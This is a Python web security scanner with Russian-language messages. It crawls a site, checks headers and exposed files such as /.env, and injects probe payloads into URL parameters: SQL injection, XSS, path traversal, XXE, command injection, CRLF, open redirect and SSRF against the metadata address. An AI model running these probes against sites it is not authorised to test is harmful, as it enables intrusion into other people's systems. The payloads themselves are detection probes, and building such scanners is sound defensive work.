import requests
from bs4 import BeautifulSoup
import urllib.parse
import time
import sys
import datetime

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    RESET = '\033[0m'

class UltimateSecurityScannerV9:
    def __init__(self, start_url):
        self.start_url = start_url
        self.parsed_start = urllib.parse.urlparse(start_url)
        self.domain = self.parsed_start.netloc
        self.scheme = self.parsed_start.scheme
        self.base_domain_url = f"{self.scheme}://{self.domain}"
        
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (UltimateSecurityScannerV9/9.0)'})
        self.found_urls = []
        
        # Хранилище для отчета
        self.report_results = []

        # Базы данных для SQLi
        self.db_errors = {
            "MySQL": ["you have an error in your sql syntax", "mysql_fetch", "check the manual that corresponds to your mysql"],
            "PostgreSQL": ["postgresql query failed", "pg_query()", "syntax error at or near"],
            "SQLite": ["sqlite3.operationalerror", "unclosed quotation mark after the character string"],
            "MSSQL": ["microsoft oledb provider for sql server", "unclosed quotation mark before the character string"]
        }
        
        # Набор XSS пейлоадов
        self.xss_payloads = [
            "<script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\"><img src=x onerror=alert(1)>",
            "'\"><svg/onload=alert(1)>",
            "javascript:alert(1)"
        ]

        # Конфиги и файлы
        self.sensitive_paths = [
            "/robots.txt", "/sitemap.xml", "/.env", "/backup.zip", "/backup.tar.gz",
            "/config.json", "/config.php", "/admin/", "/administrator/", "/wp-login.php",
            "/.git/HEAD", "/phpinfo.info", "/info.php", "/api/v1/", "/server-status"
        ]

        # LFI / Path Traversal
        self.lfi_payloads = [
            "../../../../etc/passwd",
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "/etc/passwd"
        ]

        # Open Redirect
        self.redirect_payloads = [
            "http://evil-redirect-test.com",
            "//evil-redirect-test.com"
        ]

        # SSRF пейлоады
        self.ssrf_payloads = [
            "http://127.0.0.1/",
            "http://169.254.169.254/"
        ]

        # XXE пейлоады
        self.xxe_payloads = [
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
        ]

        # Command Injection / RCE пейлоады
        self.rce_payloads = [
            ";id",
            "|id",
            "&id"
        ]

        # CRLF пейлоады
        self.crlf_payloads = [
            "%0d%0aInjected-Header: test",
            "\r\nInjected-Header: test"
        ]

    def log_vuln(self, message):
        print(message)
        clean_msg = message
        for c in [Colors.GREEN, Colors.YELLOW, Colors.RED, Colors.BLUE, Colors.CYAN, Colors.MAGENTA, Colors.RESET]:
            clean_msg = clean_msg.replace(c, '')
        self.report_results.append(clean_msg)

    # --- 1. КРАУЛЕР ---
    def run_crawler(self):
        print(f"\n{Colors.BLUE}[*] Запуск краулера для сбора целей на: {self.start_url}{Colors.RESET}")
        visited_links = set()
        target_urls = set()

        try:
            response = self.session.get(self.start_url, timeout=10)
        except requests.exceptions.RequestException as e:
            print(f"{Colors.RED}[!] Ошибка подключения: {e}{Colors.RESET}")
            return

        soup = BeautifulSoup(response.text, 'html.parser')
        for link in soup.find_all('a', href=True):
            href = link.get('href')
            full_url = urllib.parse.urljoin(self.start_url, href)
            parsed_url = urllib.parse.urlparse(full_url)
            
            if parsed_url.netloc == self.domain:
                clean_url = parsed_url._replace(fragment='').geturl()
                if clean_url not in visited_links:
                    visited_links.add(clean_url)
                    if '=' in parsed_url.query:
                        target_urls.add(clean_url)

        self.found_urls = list(target_urls)
        print(f"\n{Colors.GREEN}[+] Успешно собрано уникальных URL с параметрами: {len(self.found_urls)}{Colors.RESET}")
        for idx, url in enumerate(self.found_urls, 1):
            print(f"    {idx}. {url}")

    # --- 2. ПРОВЕРКА ФАЙЛОВ И ДИРЕКТОРИЙ ---
    def check_sensitive_files(self):
        self.log_vuln(f"\n{Colors.CYAN}[*] Модуль: Сканирование открытых конфигов и путей...{Colors.RESET}")
        for path in self.sensitive_paths:
            check_url = self.base_domain_url + path
            try:
                res = self.session.get(check_url, timeout=4, allow_redirects=False)
                if res.status_code == 200:
                    if "index of /" in res.text.lower():
                        self.log_vuln(f"  {Colors.RED}[!] УЯЗВИМОСТЬ (Directory Listing): Открыт каталог -> {check_url}{Colors.RESET}")
                    else:
                        self.log_vuln(f"  {Colors.RED}[!] УЯЗВИМОСТЬ (Info Disclosure): Открытый файл -> {check_url} (200 OK){Colors.RESET}")
                elif res.status_code == 403:
                    pass
            except:
                continue

    # --- 3. ГЛУБОКИЙ АУДИТ URL ---
    def audit_single_url(self, target_url):
        self.log_vuln(f"\n{Colors.MAGENTA}=================================================={Colors.RESET}")
        self.log_vuln(f"{Colors.CYAN}[*] Аудит цели: {target_url}{Colors.RESET}")
        self.log_vuln(f"{Colors.MAGENTA}=================================================={Colors.RESET}")
        
        try:
            response = self.session.get(target_url, timeout=10)
        except Exception as e:
            self.log_vuln(f"{Colors.RED}[!] Ошибка запроса: {e}{Colors.RESET}")
            return

        soup = BeautifulSoup(response.text, 'html.parser')
        headers = response.headers

        if self.scheme != 'https':
            self.log_vuln(f"  {Colors.YELLOW}[!] РИСК (SSL/TLS): Сайт работает по обычному HTTP (соединение не зашифровано).{Colors.RESET}")

        xfo = headers.get('X-Frame-Options', '').lower()
        csp = headers.get('Content-Security-Policy', '').lower()
        cors = headers.get('Access-Control-Allow-Origin', '')
        hsts = headers.get('Strict-Transport-Security', '')

        if not (xfo in ['deny', 'sameorigin'] or 'frame-ancestors' in csp):
            self.log_vuln(f"  {Colors.RED}[!] УЯЗВИМОСТЬ (Clickjacking): Не защищен от iframe.{Colors.RESET}")

        if cors == '*':
            self.log_vuln(f"  {Colors.RED}[!] УЯЗВИМОСТЬ (CORS Misconfiguration): Allow-Origin: *{Colors.RESET}")

        if not hsts and self.scheme == 'https':
            self.log_vuln(f"  {Colors.YELLOW}[!] Рекомендация (Low): HSTS заголовок отсутствует.{Colors.RESET}")

        try:
            vuln_host_res = self.session.get(target_url, headers={'Host': 'evil-host-test.com'}, timeout=5)
            if 'evil-host-test.com' in vuln_host_res.text:
                self.log_vuln(f"  {Colors.RED}[!] УЯЗВИМОСТЬ (Host Header Injection): Отражение поддельного Host в теле ответа!{Colors.RESET}")
        except:
            pass

        if response.cookies:
            for cookie in response.cookies:
                if not cookie.secure:
                    self.log_vuln(f"  {Colors.YELLOW}[!] РИСК (Cookie): Кука '{cookie.name}' без флага Secure.{Colors.RESET}")
                if not cookie.has_nonstandard_attr('httponly') and not cookie.rest.get('HttpOnly'):
                    self.log_vuln(f"  {Colors.YELLOW}[!] РИСК (Cookie): Кука '{cookie.name}' без флага HttpOnly.{Colors.RESET}")

        comments = soup.find_all(string=lambda text: isinstance(text, str) and ('todo' in text.lower() or 'password' in text.lower() or 'admin' in text.lower()))
        if comments:
            self.log_vuln(f"  {Colors.RED}[!] УЯЗВИМОСТЬ (Info Disclosure - Comments): Найдены секреты в коде HTML!{Colors.RESET}")

        parsed = urllib.parse.urlparse(target_url)
        query_params = dict(urllib.parse.parse_qsl(parsed.query))
        
        if not query_params:
            return

        for param_name in query_params.keys():
            for payload in ["'", "\"", "' OR '1'='1"]:
                test_params = query_params.copy()
                test_params[param_name] = str(test_params[param_name]) + payload
                test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(test_params)))
                try:
                    res = self.session.get(test_url, timeout=5)
                    res_lower = res.text.lower()
                    for db, errors in self.db_errors.items():
                        if any(err in res_lower for err in errors):
                            self.log_vuln(f"  {Colors.RED}[!] УЯЗВИМОСТЬ (Error-based SQLi [{db}]): Параметр '{param_name}'{Colors.RESET}")
                            break
                except:
                    continue

        for param_name in query_params.keys():
            for payload in self.xss_payloads:
                test_params = query_params.copy()
                test_params[param_name] = payload
                test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(test_params)))
                try:
                    res = self.session.get(test_url, timeout=5)
                    if payload in res.text:
                        self.log_vuln(f"  {Colors.RED}[!] УЯЗВИМОСТЬ (Reflected XSS): Параметр '{param_name}'{Colors.RESET}")
                        break
                except:
                    continue

        for param_name in query_params.keys():
            for lfi_payload in self.lfi_payloads:
                test_params = query_params.copy()
                test_params[param_name] = lfi_payload
                test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(test_params)))
                try:
                    res = self.session.get(test_url, timeout=5)
                    if "root:x:" in res.text or "bin:x:" in res.text:
                        self.log_vuln(f"  {Colors.RED}[!] УЯЗВИМОСТЬ (Local File Inclusion): Параметр '{param_name}' читает файлы!{Colors.RESET}")
                        break
                except:
                    continue

        for param_name in query_params.keys():
            if any(w in param_name.lower() for w in ['cmd', 'exec', 'ping', 'ip', 'command', 'host', 'query']):
                for rce_payload in self.rce_payloads:
                    test_params = query_params.copy()
                    test_params[param_name] = str(test_params[param_name]) + rce_payload
                    test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(test_params)))
                    try:
                        res = self.session.get(test_url, timeout=5)
                        if "uid=" in res.text or "gid=" in res.text:
                            self.log_vuln(f"  {Colors.RED}[!] УЯЗВИМОСТЬ (Command Injection / RCE): Параметр '{param_name}' выполняет команды ОС!{Colors.RESET}")
                            break
                    except:
                        continue

        for param_name in query_params.keys():
            for crlf_payload in self.crlf_payloads:
                test_params = query_params.copy()
                test_params[param_name] = crlf_payload
                test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(test_params)))
                try:
                    res = self.session.get(test_url, timeout=5)
                    if 'injected-header' in [h.lower() for h in res.headers.keys()]:
                        self.log_vuln(f"  {Colors.RED}[!] УЯЗВИМОСТЬ (CRLF Injection): Параметр '{param_name}' внедряет заголовки ответа!{Colors.RESET}")
                        break
                except:
                    continue

        for param_name in query_params.keys():
            if any(w in param_name.lower() for w in ['url', 'redirect', 'next', 'to', 'link', 'goto']):
                for redir_payload in self.redirect_payloads:
                    test_params = query_params.copy()
                    test_params[param_name] = redir_payload
                    test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(test_params)))
                    try:
                        res = self.session.get(test_url, allow_redirects=False, timeout=5)
                        if res.status_code in [301, 302, 303, 307, 308] and 'evil-redirect-test.com' in res.headers.get('Location', ''):
                            self.log_vuln(f"  {Colors.RED}[!] УЯЗВИМОСТЬ (Open Redirect): Параметр '{param_name}'{Colors.RESET}")
                            break
                    except:
                        continue

            if any(w in param_name.lower() for w in ['url', 'src', 'path', 'feed', 'api', 'host', 'dest']):
                for ssrf_payload in self.ssrf_payloads:
                    test_params = query_params.copy()
                    test_params[param_name] = ssrf_payload
                    test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(test_params)))
                    try:
                        res = self.session.get(test_url, timeout=6)
                        if "root:x:" in res.text or "instance-id" in res.text or res.status_code == 200:
                            self.log_vuln(f"  {Colors.RED}[!] УЯЗВИМОСТЬ (SSRF): Параметр '{param_name}'{Colors.RESET}")
                            break
                    except:
                        continue

        forms = soup.find_all('form')
        for idx, form in enumerate(forms):
            action = form.get('action')
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            
            if method == 'post':
                has_csrf = any('csrf' in i.get('name', '').lower() or 'token' in i.get('name', '').lower() for i in inputs)
                if not has_csrf:
                    self.log_vuln(f"  {Colors.RED}[!] УЯЗВИМОСТЬ (CSRF): POST-форма #{idx+1} без токена защиты.{Colors.RESET}")

    def save_report(self):
        filename = "scan_report.txt"
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write(f"=== WEB SECURITY SCAN REPORT ===\n")
                f.write(f"Target: {self.start_url}\n")
                f.write(f"Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"================================\n\n")
                for line in self.report_results:
                    f.write(line + "\n")
            print(f"\n{Colors.GREEN}[+] Отчет успешно сохранен в файл: {filename}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[!] Не удалось сохранить отчет: {e}{Colors.RESET}")

    def run_ultimate_scan(self):
        if not self.found_urls:
            print(f"\n{Colors.YELLOW}[!] Сначала запусти краулер (пункт 1), чтобы собрать ссылки в память!{Colors.RESET}")
            return

        print(f"\n{Colors.BLUE}[*] Старт ULTIMATE-аудита по всем целям краулера ({len(self.found_urls)} шт.)...{Colors.RESET}")
        
        self.check_sensitive_files()

        for idx, url in enumerate(self.found_urls, 1):
            print(f"\n[Прогресс: {idx}/{len(self.found_urls)}]")
            self.audit_single_url(url)
        
        self.save_report()
        print(f"\n{Colors.GREEN}[+] Все проверки завершены!{Colors.RESET}")

if __name__ == "__main__":
    print(f"{Colors.BLUE}=== ULTIMATE WEB SECURITY SCANNER V9.0 ==={Colors.RESET}")
    user_url = input("Введите главный URL сайта (например, https://vitomax.ua): ").strip()
    
    if not user_url.startswith("http"):
        user_url = "http://" + user_url

    scanner = UltimateSecurityScannerV9(user_url)

    while True:
        print(f"\n{Colors.YELLOW}Главное меню:{Colors.RESET}")
        print("1. Запустить краулер (собрать и запомнить все ссылки с параметрами)")
        print("2. Запустить ULTIMATE-аудит (Всё включено + RCE, CRLF, SSL Check + Авто-отчет)")
        print("3. Проверить один конкретный URL вручную")
        print("4. Выход")
        
        choice = input("Ваш выбор (1/2/3/4): ").strip()
        
        if choice == "1":
            scanner.run_crawler()
        elif choice == "2":
            scanner.run_ultimate_scan()
        elif choice == "3":
            custom_url = input("Введите точный URL для проверки: ").strip()
            scanner.audit_single_url(custom_url)
            scanner.save_report()
        elif choice == "4":
            print("Выход из программы. Удачи!")
            sys.exit(0)
        else:
            print(f"{Colors.RED}[!] Неверный выбор. Попробуй еще раз.{Colors.RESET}")
